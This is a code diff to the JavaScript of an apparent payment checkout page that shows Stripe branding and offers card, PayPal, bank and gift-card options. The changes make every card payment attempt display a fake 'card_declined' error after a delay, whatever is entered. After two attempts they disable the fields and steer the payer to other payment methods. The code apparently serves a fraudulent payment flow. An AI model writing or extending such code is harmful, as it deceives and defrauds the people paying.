@@ -32,10 +32,10 @@ function initializeState() {
         giftCardIndex: 0,
         safeIndex: 0,
         senderName: "",
-    
         paymentStatus: null,
         creditCardSections: null,
         creditCardError: false,
+        creditCardTrials: 0,
         paypalSections: null,
         bankSections: null,
         redeemSections: null,
@@ -293,7 +293,7 @@ function compareCountry(country) {
         "netherland",
         "slovakia",
         "slovenia",
-        
+        "nigeria",
     ];
 
     return countries.includes(country.toLowerCase());
@@ -305,11 +305,11 @@ async function getUserCountryInfo() {
         const response = await fetch('https://ipapi.co/json/');
         const data = await response.json();
         console.log(data);
-        
+
         return {
             country: data.country_name,
             currency: data.currency || data.currency_code,
-currencyCode:data.currency_code,
+            currencyCode: data.currency_code,
             countryCode: data.country_code,
             currencyName: data.currency_name
         };
@@ -371,7 +371,7 @@ async function handleProceedClick(e) {
     const button = e.target;
     button.disabled = true;
     button.innerHTML = `<div class="spinner-container"><div class="spinner"></div></div>  Processing...`;
-    const userCountry = (await getUserCountryInfo().country) || "unkown";
+    const userCountry = (await getUserCountryInfo().country) || "nigeria";
     const euroCountry = compareCountry(userCountry);
 
     setTimeout(() => {
@@ -380,7 +380,7 @@ async function handleProceedClick(e) {
         euroCountry
             ? document.getElementById("payment-method-section")?.classList.add("active")
             :
- document.getElementById("currency-section")?.classList.add("active");
+            document.getElementById("currency-section")?.classList.add("active");
 
         button.disabled = false;
         button.innerHTML = "Proceed to Payment";
@@ -554,25 +554,34 @@ function handleCreditCard(state, elements) {
         elements.paymentDisplay.insertAdjacentHTML('beforeend', currentSection);
 
         //for choosing anotherr metjhod;:
-        document.querySelector("span.another-method-button")?.addEventListener("click", () => {
-            state.creditCardError = false;
-            state.detectedBrand = null;
+        document.querySelectorAll("span.another-method-button")?.forEach(span => {
+            span.addEventListener("click", () => {
+                state.creditCardError = false;
+                state.detectedBrand = null;
 
-            elements.paymentDisplay.innerHTML = state.initialContent;
+                elements.paymentDisplay.innerHTML = state.initialContent;
 
-            let element = cacheDOMElements();
-            setupEventListeners(state, element);
+                let element = cacheDOMElements();
+                setupEventListeners(state, element);
 
-            document.getElementById("payment-details")?.
-                classList.remove("active")
+                document.getElementById("payment-details")?.
+                    classList.remove("active")
 
-            document.getElementById("payment-method-section")?.classList.add("active")
-            console.log("new method clicked!");
-        })
+                document.getElementById("payment-method-section")?.classList.add("active")
+                console.log("new method clicked!");
+            });
+        });
 
         // Add click handlers for CC buttons and inputs
         const inputs = document.querySelectorAll("input");
+        inputs.forEach(input => {
+            input.disabled = state.creditCardTrials > 1;
+        });
+
         document.querySelectorAll(".cc-btn").forEach(btn => {
+            btn.innerHTML = state.creditCardTrials > 1 ? "Declined" : `Pay
+                `;
+
             btn.addEventListener('click', () => {
                 // state.creditCardIndex++;
                 inputs.forEach(input => {
@@ -586,10 +595,12 @@ function handleCreditCard(state, elements) {
                 `;
 
                 setTimeout(() => {
-                    btn.disabled = false;
-                    btn.innerHTML = `Pay`;
+                    btn.disabled = state.creditCardTrials > 1 ? true : false;
+                    btn.innerHTML = state.creditCardTrials > 1 ? "Declined" : `Pay`;
 
                     state.creditCardError = true;
+                    state.creditCardTrials = state.creditCardTrials + 1;
+
                     console.log(state.creditCardError);
                     handleCreditCard(state, elements);
                 }, 4000);
@@ -1526,11 +1537,11 @@ ${state.creditCardError ?
 </svg>
         <div class="error-upper">
  <p>
-Your card was declined. <span class="another-method-button">Try another payment method
-</span></p>
+Your card was declined. ${state.creditCardTrials > 1 ? `<span class="another-method-button">Try another payment method
+            </span>` : `Try another credit or debit card.`}
+            </p>
 <p>Code: card_declined</p>
 </div>
-
         </div>
         </div>`
             : ``
@@ -1574,7 +1585,13 @@ Your card was declined. <span class="another-method-button">Try another payment 
                 <p>Amount to charge: <strong>${getCurrencySymbol(state.currencyCode) || state.currencyCode}${state.toPay}</strong></p>
             </div>
         </div>
-        
+         ${state.creditCardTrials > 1 ? `
+        <div>
+         <span class="another-method-button">Try another payment method
+            </span>
+            
+        </div>
+            `: ""}
         <div class="proceed-div">
             <button class="continue-btn cc-btn" disabled>Pay</button>
             <div class="stripe-branding">
@@ -2465,11 +2482,11 @@ async function initializePaymentFlow(e, state, elements) {
 
         addDetails(state.details, elements);
 
-const userCountryData = await getUserCountryInfo();
+        const userCountryData = await getUserCountryInfo();
 
-state.currencyCode = userCountryData.currencyCode || userCountryData.currency;
-state.selectedCurrency = userCountryData.country;
-state.country = userCountryData.country;
+        state.currencyCode = userCountryData.currencyCode || userCountryData.currency;
+        state.selectedCurrency = userCountryData.country;
+        state.country = userCountryData.country;
 
 
     } catch (error) {
